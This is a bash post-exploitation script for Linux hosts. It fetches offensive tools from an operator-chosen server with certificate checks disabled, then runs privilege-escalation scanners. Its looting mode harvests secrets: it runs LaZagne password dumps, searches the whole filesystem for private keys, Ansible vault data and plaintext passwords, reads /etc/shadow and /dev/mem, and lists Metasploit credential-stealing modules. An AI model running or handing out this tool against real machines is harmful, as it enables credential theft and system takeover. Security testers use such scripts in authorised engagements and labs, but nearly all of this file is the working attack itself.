#!/bin/bash
### CREATED BY KARMAZ
while getopts "elu:" OPTION; do
    case $OPTION in
    e)
        echo "ESCALATION START"
        escalation_on=1
        ;;
    l)
        echo "LOOTING START"
        looting_on=1
        ;;
    u)
        server_url=$OPTARG
        ;;
    *)
        echo "You must specify the server url flag.
    USAGE: ./lisp.sh -e -l -u http://127.0.0.1/

        # -e => PRIVILEGE ESCALATION
        # -l => LOOTING
        # -u => HOST WITH TOOLS"
        exit 1
        ;;
    esac
done
if [ -z "$server_url" ]
then
echo "$server_url"
echo "You must specify the server url flag.
USAGE: ./lisp.sh -e -l -u http://127.0.0.1/
            
        # -e => PRIVILEGE ESCALATION
        # -l => LOOTING
        # -u => HOST WITH TOOLS"
exit 1
else
    if command -v wget &> /dev/null
    then
        wget_found=1
    elif command -v curl &> /dev/null
    then
        curl_found=1
    else
        echo "Install wget | curl to make the script work."
        exit 1
    fi
mkdir blood
fi

download_tools() {
    kernel_arch=$(uname -m)
    cd blood || exit
    if [ "$wget_found" == 1 ]
    then
        wget --no-check-certificate "$server_url/tools/linpeas.sh"
        wget --no-check-certificate "$server_url/tools/les.sh"
        wget --no-check-certificate "$server_url/tools/nmap.zip"
        if [ "$kernel_arch" == "x86_64" ] || [ "$kernel_arch" == "x64" ]
        then
            wget --no-check-certificate "$server_url/tools/traitor-amd64"
            wget --no-check-certificate "$server_url/tools/pspy64"
            wget --no-check-certificate "$server_url/tools/lazagne64"
        else
            wget --no-check-certificate "$server_url/tools/traitor-386"
            wget --no-check-certificate "$server_url/tools/pspy32"
            wget --no-check-certificate "$server_url/tools/lazagne32"
        fi
    elif [ "$curl_found" == 1 ]
    then
        curl -k "$server_url/tools/linpeas.sh" -o linpeas.sh
        curl -k "$server_url/tools/les.sh" -o les.sh
        curl -k "$server_url/tools/nmap.zip" -o nmap.zip
        if [ "$kernel_arch" == "x86_64" ] || [ "$kernel_arch" == "x64" ]
        then
            curl -k "$server_url/tools/traitor-amd64" -o pspy64 traitor-amd64
            curl -k "$server_url/tools/pspy64" -o pspy64
            curl -k "$server_url/tools/lazagne64" -o lazagne64
        else
            curl -k "$server_url/tools/traitor-386" -o traitor-386
            curl -k "$server_url/tools/pspy32" -o pspy32
            curl -k "$server_url/tools/lazagne32" -o lazagne32
        fi
    fi 
}

looting() {
    mkdir loot
    ./lazagne* all | tee -a loot/lazagne.txt
    echo "=======================PRIV KEYS:" | tee -a priv_keys.txt
    grep -r -a "PRIVATE KEY-----" / 2>/dev/null | tee -a priv_keys.txt
    echo "=======================ANSBILE VAULT:" | tee -a ansible_vault.txt
    grep -r -a "\!vault" / 2>/dev/null  | tee -a ansible_vault.txt
    echo "=======================SYSLOG - grep it:" | tee -a yslog.txt
    cat /var/log/syslog | tee -a syslog.txt
    echo "CHECK THESE LOCATIONS" | tee -a files_to_check.txt
    echo "=======================AUTH LOGS:" | tee -a files_to_check.txt
    find / -name auth.log 2>/dev/null | tee -a files_to_check.txt
    echo "=======================DIRECTORY LISTERNING OF THE: /var/log" | tee -a files_to_check.txt
    ls /var/log | tee -a var_log_directory_list.txt
    echo "=======================CONFIG FILES (config.php!):" | tee -a files_to_check.txt
    locate .config | tee -a files_to_check.txt
    locate config. | tee -a files_to_check.txt
    echo "=======================HISTORY FILES (.bash_history!):" | tee -a files_to_check.txt
    find / -name "*_history" -xdev 2>/dev/null
    echo "=======================PASSWORD FILES:" | tee -a files_to_check.txt
    locate password | tee -a files_to_check.txt
    echo "=======================OLD PASSWORDS:" | tee -a files_to_check.txt
    find / -name opasswd -xdev 2>/dev/null | tee -a files_to_check.txt
    echo "=======================GNOME KEYRING - cracking:" | tee -a files_to_check.txt
    locate login.keyring; locate user.keystore | tee -a files_to_check.txt
    echo "=======================PLAIN TEXT PASSWORDS:" | tee -a plain_text_pass.txt
    grep --color=auto -rnw '/' -ie "PASSWORD\|PASSWD" --color=always 2> /dev/null | tee -a plain_text_pass.txt
    echo "=======================PASSWD FILE (cracking 1)" | tee -a passwd.txt
    cat /etc/passwd
    echo "=======================SHADOW FILE (cracking 2)" | tee -a shadow.txt
    cat /etc/shadow
    echo "=======================RECENTLY MODIFIED FILES (30 MIN)" | tee -a recently_modified.txt
    find / -mmin -30 -xdev 2>/dev/null | tee -a recently_modified.txt
    echo "=======================CREDS IN MEMORY" | tee -a recently_modified.txt
    strings /dev/mem -n10 | grep --color=always -ie "PASSWORD|PASSWD"

    echo "ADDITIONAL MODULES - DO NOT FORGET:
    use post/linux/gather/enum_system
    use post/linux/gather/enum_users_history
    use post/linux/gather/gnome_commander_creds
    use post/linux/gather/hashdump
    use post/linux/gather/gnome_keyring_dump
    use post/linux/gather/enum_psk
    use post/linux/gather/enum_configs
    use post/linux/gather/ecryptfs_creds
    use post/linux/gather/mount_cifs_creds
    use post/linux/gather/openvpn_credentials
    use post/linux/gather/phpmyadmin_credsteal
    use post/linux/gather/pptpd_chap_secrets
    use post/linux/gather/tor_hiddenservices
    use post/multi/gather/filezilla_client_cred
    use post/multi/gather/firefox_creds
    use post/multi/gather/gpg_creds
    use post/multi/gather/grub_creds
    use post/multi/gather/irssi_creds
    use post/multi/gather/lastpass_creds
    use post/multi/gather/maven_creds
    use post/multi/gather/netrc_creds
    use post/multi/gather/pgpass_creds
    use post/multi/gather/pidgin_cred
    use post/multi/gather/remmina_creds
    use post/multi/gather/rsyncd_creds
    use post/multi/gather/ssh_creds
    use post/multi/gather/thunderbird_creds"
}

escalation() {
    mkdir priv
    ./linpeas.sh -a | tee -a priv/linpeas.txt
    ./les.sh | tee -a priv/les.txt
    ./traitor* | tee -a priv/traitor.txt
    ./pspy* | tee -a priv/pspy.txt
}



download_tools

if [ $escalation_on == 1 ]
then 
    escalation
fi

if [ $looting_on == 1 ]
then 
    looting
fi